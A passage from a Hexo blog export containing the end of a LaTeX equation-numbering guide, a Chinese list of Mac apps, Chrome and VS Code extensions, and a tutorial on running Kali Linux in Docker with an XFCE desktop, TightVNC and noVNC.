\begin{aligned}
a &amp;= b + c \\
  &amp;= d + e + f + g \\
  &amp;= h + i
\end{aligned}
\end{equation}\]</span></p>
<p>引用上述多行公式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">Equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq2&#125;</span></span>$</span> is a multi-line equation.</span><br></pre></td></tr></table></figure>
<p>Equation <span class="math inline">\(\eqref{eq2}\)</span> is a multi-line equation.</p>
<h2 id="多行多编号公式">多行多编号公式</h2>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span></span><br><span class="line"><span class="formula">a &amp;= b + c <span class="tag">\<span class="name">label</span><span class="string">&#123;eq3&#125;</span></span> <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">x &amp;= yz <span class="tag">\<span class="name">label</span><span class="string">&#123;eq4&#125;</span></span><span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">l &amp;= m - n <span class="tag">\<span class="name">label</span><span class="string">&#123;eq5&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure>
<p><span class="math display">\[\begin{align}
a &amp;= b + c \label{eq3} \\
x &amp;= yz \label{eq4}\\
l &amp;= m - n \label{eq5}
\end{align}\]</span></p>
<p>引用上述多行公式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">There are three aligned equations: equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq3&#125;</span></span>$</span>, equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq4&#125;</span></span>$</span> and equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq5&#125;</span></span>$</span>.</span><br></pre></td></tr></table></figure>
<p>There are three aligned equations: equation <span class="math inline">\(\eqref{eq3}\)</span>, equation <span class="math inline">\(\eqref{eq4}\)</span> and equation <span class="math inline">\(\eqref{eq5}\)</span>.</p>
<h2 id="无编号公式">无编号公式</h2>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span></span><br><span class="line"><span class="formula">-4 + 5x &amp;= 2+y <span class="tag">\<span class="name">nonumber</span></span>  <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula"> w+2 &amp;= -1+w <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula"> ab &amp;= cb</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure>
<p><span class="math display">\[\begin{align}
-4 + 5x &amp;= 2+y \nonumber  \\
 w+2 &amp;= -1+w \\
 ab &amp;= cb
\end{align}\]</span></p>
<h2 id="用tag指定编号文字">用\tag指定编号文字</h2>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="formula">$$x+1<span class="tag">\<span class="name">over</span></span><span class="tag">\<span class="name">sqrt</span><span class="string">&#123;1-x^2&#125;</span></span> <span class="tag">\<span class="name">tag</span><span class="string">&#123;i&#125;</span></span><span class="tag">\<span class="name">label</span><span class="string">&#123;eq_tag&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure>
<p><span class="math display">\[x+1\over\sqrt{1-x^2} \tag{i}\label{eq_tag}\]</span></p>
<p>引用上述公式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">Equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq_tag&#125;</span></span>$</span> use `<span class="tag">\<span class="name">tag</span><span class="string">&#123;&#125;</span></span>` instead of automatic numbering.</span><br></pre></td></tr></table></figure>
<p>Equation <span class="math inline">\(\eqref{eq_tag}\)</span> use <code>\tag{}</code> instead of automatic numbering.</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>Hexo Next</tag>
        <tag>LaTeX</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>我的Mac装机软件汇总</title>
    <url>/tech/my-mac-apps/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Overview of My Apps in Mac OS</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>工欲善其事，必先利其器</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<ol type="1">
<li>常用必备软件（Chrome/QQ等）除外</li>
<li>我使用的是Mac OS，因此列表中小部分软件可能没有windows版本</li>
</ol>
<a id="more"></a>
<h1 id="基础软件">基础软件</h1>
<table>
<thead>
<tr class="header">
<th>Name</th>
<th>Type</th>
<th>Desc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>AppManager</td>
<td>系统</td>
<td>app卸载</td>
</tr>
<tr class="even">
<td>Colossus</td>
<td>系统</td>
<td>CPU、内存、网络流量等监控</td>
</tr>
<tr class="odd">
<td>Dr. Cleaner</td>
<td>系统</td>
<td>垃圾文件清理、内存优化、app卸载等</td>
</tr>
<tr class="even">
<td>Dr. Unarchiver</td>
<td>系统</td>
<td>解压缩</td>
</tr>
<tr class="odd">
<td>EBMac</td>
<td>学习</td>
<td>EPWING格式字典加载</td>
</tr>
<tr class="even">
<td>Find Exchange</td>
<td>金融</td>
<td>汇率换算</td>
</tr>
<tr class="odd">
<td>Free Download Manager</td>
<td>系统</td>
<td>下载工具</td>
</tr>
<tr class="even">
<td>F.lux</td>
<td>系统</td>
<td>自动调节屏幕蓝光，保护眼睛</td>
</tr>
<tr class="odd">
<td>LibreOffice</td>
<td>办公</td>
<td>基于OpenOffice，Mac OS上的开源Office全家桶</td>
</tr>
<tr class="even">
<td>Mounty for NTFS</td>
<td>系统</td>
<td>支持在Mac OS读取NTFS格式（移动）硬盘</td>
</tr>
<tr class="odd">
<td>MPV</td>
<td>多媒体</td>
<td>播放软件里的MVP，开源</td>
</tr>
<tr class="even">
<td>OmniDiskSweeper</td>
<td>系统</td>
<td>Mac硬盘不知不觉快满了，一般清理软件清理并无改善时，用来找出到底是哪些大文件(夹)占用来硬盘空间的利器</td>
</tr>
<tr class="odd">
<td>PhotoScape X</td>
<td>多媒体</td>
<td>傻瓜化的照片处理软件</td>
</tr>
<tr class="even">
<td>Super Player Lite</td>
<td>多媒体</td>
<td>播放器</td>
</tr>
<tr class="odd">
<td>The Unarchiver</td>
<td>系统</td>
<td>解压缩</td>
</tr>
<tr class="even">
<td>万年历</td>
<td>系统</td>
<td>日历、天气</td>
</tr>
</tbody>
</table>
<h1 id="专业软件">专业软件</h1>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 4%" />
<col style="width: 84%" />
</colgroup>
<thead>
<tr class="header">
<th>Name</th>
<th>Type</th>
<th>Desc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Anki</td>
<td>生产力</td>
<td>开源记忆软件，语言学习及各门学科备考神器</td>
</tr>
<tr class="even">
<td>CamScanner</td>
<td>多媒体</td>
<td>强大的OCR软件</td>
</tr>
<tr class="odd">
<td>FreeMind</td>
<td>生产力</td>
<td>脑图软件</td>
</tr>
<tr class="even">
<td>GIMP</td>
<td>多媒体</td>
<td>开源版&quot;photoshop&quot;，<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVM0NDExTjdpNw==">教程<i class="fa fa-external-link-alt"></i></span></td>
</tr>
<tr class="odd">
<td>MarginNote Pro</td>
<td>生产力</td>
<td>文档标注工具，研读学术论文、书籍的神器，方便地制作Mind Map，以及生成Anki卡片用来反复记忆。可惜目前只有Mac OS版本</td>
</tr>
<tr class="even">
<td>MacDown</td>
<td>文字</td>
<td></td>
</tr>
<tr class="odd">
<td>OverSight</td>
<td>安全</td>
<td>监控当前哪些程序使用摄像头/麦克风</td>
</tr>
<tr class="even">
<td>Simplenote</td>
<td>文字</td>
<td>基于markdown的云记事本</td>
</tr>
<tr class="odd">
<td>Slack</td>
<td>通讯</td>
<td></td>
</tr>
<tr class="even">
<td>TeamViewer</td>
<td>通讯</td>
<td></td>
</tr>
<tr class="odd">
<td>Telegram</td>
<td>通讯</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="开发相关">开发相关</h1>
<table>
<thead>
<tr class="header">
<th>Name</th>
<th>Type</th>
<th>Desc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Anaconda</td>
<td>开发</td>
<td>AI编程全家桶，python多版本管理利器</td>
</tr>
<tr class="even">
<td>cd to</td>
<td>系统</td>
<td>在Finder文件夹窗口，添加图标，可以一键打开当前目录的shell</td>
</tr>
<tr class="odd">
<td>Dash</td>
<td>开发</td>
<td></td>
</tr>
<tr class="even">
<td>DB Browser for SQLite</td>
<td>数据库</td>
<td>GUI SQLite客户端</td>
</tr>
<tr class="odd">
<td>iHex</td>
<td>文本</td>
<td>16进制编辑</td>
</tr>
<tr class="even">
<td>MacVim</td>
<td>文本</td>
<td>文本编辑</td>
</tr>
<tr class="odd">
<td>Pencil</td>
<td>开发</td>
<td>开源的UI原型设计工具</td>
</tr>
<tr class="even">
<td>pgadmin</td>
<td>开发</td>
<td>基于web的PostgreSQL客户端</td>
</tr>
<tr class="odd">
<td>Postman</td>
<td>开发</td>
<td>HTTP测试</td>
</tr>
<tr class="even">
<td>PxCook</td>
<td>设计</td>
<td>自动标注工具</td>
</tr>
<tr class="odd">
<td>Sequel Pro</td>
<td>数据库</td>
<td>GUI MySQL客户端</td>
</tr>
<tr class="even">
<td>Termius</td>
<td>开发</td>
<td>GUI SSH客户端</td>
</tr>
<tr class="odd">
<td>Virtual Box</td>
<td>虚拟机</td>
<td></td>
</tr>
<tr class="even">
<td>VMware Fusion</td>
<td>虚拟机</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="chrome-扩展">Chrome 扩展</h1>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 5%" />
<col style="width: 79%" />
</colgroup>
<thead>
<tr class="header">
<th>Name</th>
<th>Type</th>
<th>Desc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>AdBlock</td>
<td>系统</td>
<td>广告拦截</td>
</tr>
<tr class="even">
<td>ApiDebug Http Test</td>
<td>开发</td>
<td>Chrome插件版&quot;Postman&quot;</td>
</tr>
<tr class="odd">
<td>Better History</td>
<td>系统</td>
<td>Chrome的历史增强插件，有强大的检索规则</td>
</tr>
<tr class="even">
<td>Black Menu for Google</td>
<td>系统</td>
<td>Google全家桶的快捷方式</td>
</tr>
<tr class="odd">
<td>Bookmark Sidebar</td>
<td>系统</td>
<td>强大的收藏夹管理插件，基于默认的收藏夹，功能比默认的不知道高到～</td>
</tr>
<tr class="even">
<td>ChroPath</td>
<td>开发</td>
<td>快速确定元素的xpath，支持iframe</td>
</tr>
<tr class="odd">
<td>ColorZilla</td>
<td>开发</td>
<td>获取RGB值</td>
</tr>
<tr class="even">
<td>Dark Reader</td>
<td>健康</td>
<td>网页背景色变黑，保护眼睛（tab多时会影响页面性能，因为默认好像是适用所有tab？）</td>
</tr>
<tr class="odd">
<td>EditThisCookie</td>
<td>开发</td>
<td>强大的Cookie编辑管理插件</td>
</tr>
<tr class="even">
<td>Fatkun Batch Download Image</td>
<td>多媒体</td>
<td>强大的页面图片批量下载插件</td>
</tr>
<tr class="odd">
<td>Free Download Manager</td>
<td>系统</td>
<td>系统的Free Download Manager唤醒用</td>
</tr>
<tr class="even">
<td>Google Docs Offline</td>
<td>办公</td>
<td>离线编辑Google Office文档</td>
</tr>
<tr class="odd">
<td>Grammarly for Chrome</td>
<td>生产力</td>
<td>对输入英文进行语法拼写检查</td>
</tr>
<tr class="even">
<td>Honey</td>
<td>购物</td>
<td>欧美各大电商网站，在下单页面自动填入可用的优惠券打折码</td>
</tr>
<tr class="odd">
<td>Japanese IO</td>
<td>生产力</td>
<td>网页日语单词划词查询，加入Japanese IO生词本，之后在其网站可以进行复习</td>
</tr>
<tr class="even">
<td>JSON-handle</td>
<td>开发</td>
<td>格式化页面的json文本</td>
</tr>
<tr class="odd">
<td>Kami Extension</td>
<td>生产力</td>
<td>强大的文档标注工具，类似于MarginNote Pro，但没有脑图、制卡功能</td>
</tr>
<tr class="even">
<td>Lighthouse</td>
<td>开发</td>
<td>对站点各种性能指标进行评估，以给网站管理人员提供对进行网站优化的数据依据</td>
</tr>
<tr class="odd">
<td>Live editor for CSS, Less &amp; Sass</td>
<td>开发</td>
<td>使用页面编辑器实时预览CSS/Less/Sass代码。自动完成，更少的/Sass到CSS，美化，缩小，CSS重新加载，lint。。。</td>
</tr>
<tr class="even">
<td>Momentum</td>
<td>系统</td>
<td>让chrome新标签页拥有美图、时间、天气、TODO等多功能</td>
</tr>
<tr class="odd">
<td>Nimbus Screenshot &amp; Screen Video Recorder</td>
<td>多媒体</td>
<td>强大的网页截图，支持全网页、滚动等各种截图模式，也支持录制视频</td>
</tr>
<tr class="even">
<td>NooBoss</td>
<td>系统</td>
<td>强大的chrome插件管理工具，比默认的不知道高到～</td>
</tr>
<tr class="odd">
<td>Octotree</td>
<td>开发</td>
<td>为github仓库增加专属的侧边栏，以文件树的模式查看仓库的文件。同时支持github的夜间模式</td>
</tr>
<tr class="even">
<td>One-click Image Reader (OCR)</td>
<td>多媒体</td>
<td>截图+OCR</td>
</tr>
<tr class="odd">
<td>Online Dictionary Helper</td>
<td>生产力</td>
<td>强大的划词词典框架，国人的作品。支持mdx词典、自制词典，内置多种英文词典及法、德、俄语等多种词典，并且支持一键制做Anki卡片（通过Anki的AnkiConnect插件），以供日后反复复习</td>
</tr>
<tr class="even">
<td>Page Ruler Redux</td>
<td>开发</td>
<td>测量网页元素的像素数</td>
</tr>
<tr class="odd">
<td>Proxy SwitchyOmega</td>
<td>系统</td>
<td>强大的HTTP/SOCKS代理工具，支持页面快速切换。比默认的不知道高到～</td>
</tr>
<tr class="even">
<td>Quick Javascript Switcher</td>
<td>系统/开发</td>
<td>快速切换页面的JS禁用/启用</td>
</tr>
<tr class="odd">
<td>Screencastify</td>
<td>多媒体</td>
<td>强大的录屏插件</td>
</tr>
<tr class="even">
<td>Session Buddy</td>
<td>系统</td>
<td>同时打开非常多Tab时，可以用它分类分组管理这些tag，暂时不用的组可以放心关闭，之后可以一键重开</td>
</tr>
<tr class="odd">
<td>Set Character Encoding</td>
<td>系统</td>
<td>网页编码设置/切换工具，比默认的方便很多👓</td>
</tr>
<tr class="even">
<td>Strict Workflow</td>
<td>生产力/健康</td>
<td>番茄钟，带有工作周期内特定网站屏蔽功能，以防止不自制地走神</td>
</tr>
<tr class="odd">
<td>Talend API Tester - Free Edition</td>
<td>开发</td>
<td>Postman 网页版 2</td>
</tr>
<tr class="even">
<td>Tampermonkey</td>
<td>系统/生产力/开发</td>
<td>强大的脚本框架和市场，可以理解为在chrome插件里存在的插件市场，我常用的脚本有：</br>·HTML5播放器增强插件</br>·百度云插件+APIKey</br>·百度网盘直链下载助手</br>·解除B站区域限制</td>
</tr>
<tr class="odd">
<td>The Great Suspender</td>
<td>系统</td>
<td>中低性能电脑的福音。当同时打开大量tab时，CPU和内存使用量很高，而通常在使用中的tab只是其中的一个或几个。该插件可以将一段时间没有被使用到的tab停止（但不关闭）以释放系统资源，需要用到的时候再单击重新加载即可</td>
</tr>
<tr class="even">
<td>Turn Off the Lights</td>
<td>健康</td>
<td>网页加灰色滤镜，保护眼睛</td>
</tr>
<tr class="odd">
<td>User-Agent Switcher for Chrome</td>
<td>开发</td>
<td>强大的User Agent切换工具</td>
</tr>
<tr class="even">
<td>Video Speed Controller</td>
<td>多媒体</td>
<td>h5视频加减速播放(有些视频默认没有提供该选项)，以及快进和后退</td>
</tr>
<tr class="odd">
<td>Wappalyzer</td>
<td>开发</td>
<td>分析当前网页(站)所使用的技术栈</td>
</tr>
<tr class="even">
<td>Web Developer</td>
<td>开发</td>
<td>为web开发人员实用工具集</td>
</tr>
<tr class="odd">
<td>Window Resizer</td>
<td>开发</td>
<td>浏览器窗口大小设置工具</td>
</tr>
<tr class="even">
<td>Yomichan</td>
<td>生产力</td>
<td>日语版的Online Dictionary Helper，对页面日语划词得到查询单词的英语解释和音频发音，同样支持自制词典。其作者也是AnkiConnect的作者，第一位实现网页划词查询并与Anki联动一键制卡的大神。其实ODH作者也是参考了该插件制作的ODH</td>
</tr>
<tr class="odd">
<td>唧唧Chrome扩展程序</td>
<td>多媒体</td>
<td>这是一个基于web，用于下载bilibili视频的在线应用程序，它能够下载99%bilibili官方视频(奇艺)，并且它将会终身免费提供使用，另外，现在它已经支持弹幕下载!</td>
</tr>
<tr class="even">
<td>猫抓</td>
<td>多媒体</td>
<td>网页多媒体资源URL嗅探工具</td>
</tr>
</tbody>
</table>
<h1 id="visual-studio-code-插件">Visual Studio Code 插件</h1>
<h2 id="插件列表导出">插件列表导出</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code --list-extensions | sed -e <span class="string">'s/^/code --install-extension /'</span> &gt; my_vscode_extensions.sh</span><br></pre></td></tr></table></figure>
<h2 id="我的插件列表">我的插件列表</h2>
<p><code>my_vscode_extensions.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code --install-extension IBM.output-colorizer</span><br><span class="line">code --install-extension alefragnani.project-manager</span><br><span class="line">code --install-extension Angular.ng-template</span><br><span class="line">code --install-extension bajdzis.vscode-database</span><br><span class="line">code --install-extension christian-kohler.npm-intellisense</span><br><span class="line">code --install-extension christian-kohler.path-intellisense</span><br><span class="line">code --install-extension clinyong.vscode-css-modules</span><br><span class="line">code --install-extension cyrilletuzi.angular-schematics</span><br><span class="line">code --install-extension dakara.transformer</span><br><span class="line">code --install-extension DavidAnson.vscode-markdownlint</span><br><span class="line">code --install-extension dbaeumer.jshint</span><br><span class="line">code --install-extension dbaeumer.vscode-eslint</span><br><span class="line">code --install-extension donjayamanne.githistory</span><br><span class="line">code --install-extension donjayamanne.jquerysnippets</span><br><span class="line">code --install-extension EditorConfig.EditorConfig</span><br><span class="line">code --install-extension eg2.vscode-npm-script</span><br><span class="line">code --install-extension esbenp.prettier-vscode</span><br><span class="line">code --install-extension fantasy.vscode-hexo-utils</span><br><span class="line">code --install-extension geyao.html-snippets</span><br><span class="line">code --install-extension GrapeCity.gc-excelviewer</span><br><span class="line">code --install-extension HookyQR.beautify</span><br><span class="line">code --install-extension jasonnutter.search-node-modules</span><br><span class="line">code --install-extension JeffersonQin.hexo-next-snippets</span><br><span class="line">code --install-extension johnpapa.angular-essentials</span><br><span class="line">code --install-extension johnpapa.Angular2</span><br><span class="line">code --install-extension johnpapa.vscode-peacock</span><br><span class="line">code --install-extension KevinRose.vsc-python-indent</span><br><span class="line">code --install-extension leizongmin.node-module-intellisense</span><br><span class="line">code --install-extension ms-azuretools.vscode-docker</span><br><span class="line">code --install-extension ms-python.python</span><br><span class="line">code --install-extension ms-vscode.cpptools</span><br><span class="line">code --install-extension ms-vscode.powershell</span><br><span class="line">code --install-extension ms-vscode.vscode-typescript-next</span><br><span class="line">code --install-extension msjsdiag.debugger-for-chrome</span><br><span class="line">code --install-extension mtxr.sqltools</span><br><span class="line">code --install-extension mushan.vscode-paste-image</span><br><span class="line">code --install-extension nickdodd79.gulptasks</span><br><span class="line">code --install-extension nrwl.angular-console</span><br><span class="line">code --install-extension PKief.material-icon-theme</span><br><span class="line">code --install-extension pranaygp.vscode-css-peek</span><br><span class="line">code --install-extension redhat.java</span><br><span class="line">code --install-extension shamanu4.django-intellisense</span><br><span class="line">code --install-extension shd101wyy.markdown-preview-enhanced</span><br><span class="line">code --install-extension sidthesloth.html5-boilerplate</span><br><span class="line">code --install-extension sysoev.language-stylus</span><br><span class="line">code --install-extension tanato.vscode-gulp</span><br><span class="line">code --install-extension thebarkman.vscode-djaneiro</span><br><span class="line">code --install-extension thekalinga.bootstrap4-vscode</span><br><span class="line">code --install-extension VisualStudioExptTeam.vscodeintellicode</span><br><span class="line">code --install-extension vscjava.vscode-java-debug</span><br><span class="line">code --install-extension vscjava.vscode-java-dependency</span><br><span class="line">code --install-extension vscjava.vscode-java-pack</span><br><span class="line">code --install-extension vscjava.vscode-java-test</span><br><span class="line">code --install-extension vscjava.vscode-maven</span><br><span class="line">code --install-extension vscode-icons-team.vscode-icons</span><br><span class="line">code --install-extension waderyan.nodejs-extension-pack</span><br><span class="line">code --install-extension xabikos.JavaScriptSnippets</span><br><span class="line">code --install-extension yzhang.markdown-all-in-one</span><br><span class="line">code --install-extension ZainChen.json</span><br><span class="line">code --install-extension zhuangtongfa.material-theme</span><br><span class="line">code --install-extension zhutian.swig</span><br></pre></td></tr></table></figure>
<h2 id="插件列表导入">插件列表导入</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash my_vscode_extensions.sh</span><br></pre></td></tr></table></figure>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vam9zZWx1aXNxLzQ3NDBlMzdhOWYyMzU4MzU3MzgxZTMwOGFhMzljNTJk">How to export your VS Code extensions from terminal<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82NTkxMzMwMA==">我的Chrome浏览器都安装了哪些扩展插件<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Mac OS</tag>
        <tag>Tools</tag>
        <tag>Setup</tag>
      </tags>
  </entry>
  <entry>
    <title>run Kali Linux in Docker and install Desktop Environment &amp; VNC</title>
    <url>/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/</url>
    <content><![CDATA[<ul>
<li>Title(CN): <em><strong>在Docker中运行Kali Linux并安装桌面环境及VNC</strong></em></li>
<li>Title(JP): <em><strong>Dockerを使ってKali Linux及びデスクトップ環境とVNC環境を構築</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="overview">Overview</h1>
<ul>
<li>Environment：Mac OS（Windows）</li>
<li>Needs ➡ HOWTO
<ul>
<li>run Kali Linux in docker ➡ using <span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS91L2thbGlsaW51eA==">kali linux official docker image<i class="fa fa-external-link-alt"></i></span></li>
<li>install Kali Desktop Environment and VNC service for kali so it can be accessed from the host machine
<ul>
<li>➡ choose one kali desktop env from e17/gnome/i3/kde/lxde/mate/xfce and install</li>
<li>➡ installing vnc server <code>tightvncserver</code></li>
</ul></li>
<li>it's better to access VNC without installing VNC client
<ul>
<li>➡ on <code>Mac OS</code>, the pre-installed app <code>Screen Sharing</code> can be used as a VNC client</li>
<li>➡ use <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vdm5jL25vVk5D">novnc<i class="fa fa-external-link-alt"></i></span> so that we can <strong>use browser as an VNC client</strong></li>
</ul></li>
</ul></li>
</ul>
<a id="more"></a>
<h1 id="run-kali-linux-in-dokcer">run Kali Linux in dokcer</h1>
<ol type="1">
<li><p>pull docker image <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull kalilinux/kali-bleeding-edge</span><br></pre></td></tr></table></figure></p></li>
<li><p>run container <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -t -d --name my-kali -p 25900:5900 -p 25901:5901 kalilinux/kali-bleeding-edge</span><br></pre></td></tr></table></figure></p></li>
<li><p>go into container <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it my-kali /bin/bash</span><br></pre></td></tr></table></figure></p></li>
<li><p>update <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">update</span></span><br><span class="line"><span class="attr">apt</span> <span class="string">upgrade</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<div class="note warning">
            <p><code>kalilinux/kali-bleeding-edge</code> is a small size image, so there is nothing in it but some essential linux components. You should install all the kali pentest tools by your self. As written in <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">here<i class="fa fa-external-link-alt"></i></span>, the available installations are（the <code>New</code> column）:</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>Old</th><th>New</th><th>Notes</th></tr></thead><tbody><tr class="odd"><td>kali-linux-full</td><td>kali-linux-large</td><td>Our previous default tools for AMD64/i386 images</td></tr><tr class="even"><td>kali-linux-all</td><td>kali-linux-everything</td><td>Every metapackage and tool listed here</td></tr><tr class="odd"><td>kali-linux-top10</td><td>kali-tools-top10</td><td>The most commonly used tools</td></tr><tr class="even"><td>kali-desktop-live</td><td>kali-desktop-live (same)</td><td>Used during a live session when booted from the image</td></tr></tbody></table><p>I chose <code>kali-linux-everything</code>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install kali-linux-everything</span><br></pre></td></tr></table></figure><p>and it took me 4 hours to finish it and the container size came out to be 15GB+ 😂</p>
          </div>
<h1 id="install-desktop-environment">install Desktop Environment</h1>
<p>As written in <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">here<i class="fa fa-external-link-alt"></i></span>, the available Desktop Environment are</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th>Old</th>
<th>New</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>kali-desktop-common</td>
<td>kali-desktop-core</td>
<td>Any key tools required for a GUI image</td>
</tr>
<tr class="even">
<td>new</td>
<td>kali-desktop-e17</td>
<td>Enlightenment (WM)</td>
</tr>
<tr class="odd">
<td>kali-desktop-gnome</td>
<td>kali-desktop-gnome (same)</td>
<td>GNOME (DE)</td>
</tr>
<tr class="even">
<td>new</td>
<td>kali-desktop-i3</td>
<td>i3 (WM)</td>
</tr>
<tr class="odd">
<td>kali-desktop-kde</td>
<td>kali-desktop-kde (same)</td>
<td>KDE (DE)</td>
</tr>
<tr class="even">
<td>kali-desktop-lxde</td>
<td>kali-desktop-lxde (same)</td>
<td>LXDE (WM)</td>
</tr>
<tr class="odd">
<td>new</td>
<td>kali-desktop-mate</td>
<td>MATE (DE)</td>
</tr>
<tr class="even">
<td>kali-desktop-xfce</td>
<td>kali-desktop-xfce (same)</td>
<td>XFCE (WM)</td>
</tr>
</tbody>
</table>
<p>old version of offical kali image used <code>kali-desktop-gnome</code> as default desktop env, but the newests version has changed into <code>kali-desktop-xfce</code>, its has smaller size and is friendly to low-cost machines.</p>
<p>so I ran</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install kali-desktop-xfce</span><br></pre></td></tr></table></figure>
<h1 id="install-tightvncserver">install tightvncserver</h1>
<p>old version of kali might use <code>vnc4server</code> as vncserver but it has gone in the new kali, now through apt install we have no choice but <code>tightvncserver</code> .</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install tightvncserver</span><br></pre></td></tr></table></figure>
<p>run <code>vncpasswd</code> for the first time to initiate your VNC password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vncpasswd</span><br></pre></td></tr></table></figure>
<p>then run the vncserver, before it you need to set bash environment variable</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> USER=root</span><br><span class="line">tightvncserver :0 -geometry 1280x800 -depth 16 -pixelformat rgb565</span><br></pre></td></tr></table></figure>
<p>the default port of vnc server is <code>5900</code>, note that my mac is host machine so that the port is <code>25900</code>, which was mapped when ran <code>docker run</code> command at the beginning. The password was the one you set when running <code>vncpasswd</code>.</p>
<p>so now I can access it from my mac through <code>Screen Sharing</code>, you can try with your VNC client to connect to <code>127.0.0.1:25900</code>, you will got it</p>
<img src="/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/1.gif" class="" title="access through VNC client">
<h1 id="install-novnc">install novnc</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install net-tools</span><br><span class="line">apt install novnc</span><br></pre></td></tr></table></figure>
<p>tunnel vncserver on port <code>5900</code> into WebSockets vpc server on port <code>5901</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/share/novnc/utils/launch.sh --listen 5901 --vnc localhost:5900</span><br></pre></td></tr></table></figure>
<p>then access http://127.0.0.1:25901/vnc.html through your browser and your will get into noVNC, and setting the WebSocket <code>Host</code> to <code>127.0.0.1</code> and <code>Port</code> to <code>25901</code> so that we can connect to VNC server. The password was the one you set when running <code>vncpasswd</code>.</p>
<img src="/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/2.gif" class="" title="access through web broswer(noVNC WebSocket)">
<h1 id="reference">reference</h1>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucG9mdHV0LmNvbS9ob3ctdG8taW5zdGFsbC1hbmQtYWNjZXNzLXRpZ2h0dm5jLXJlbW90ZS1kZXNrdG9wLWluLWxpbnV4Lw==">How To Install and Access TightVNC Remote Desktop In Linux<i class="fa fa-external-link-alt"></i></span></li>
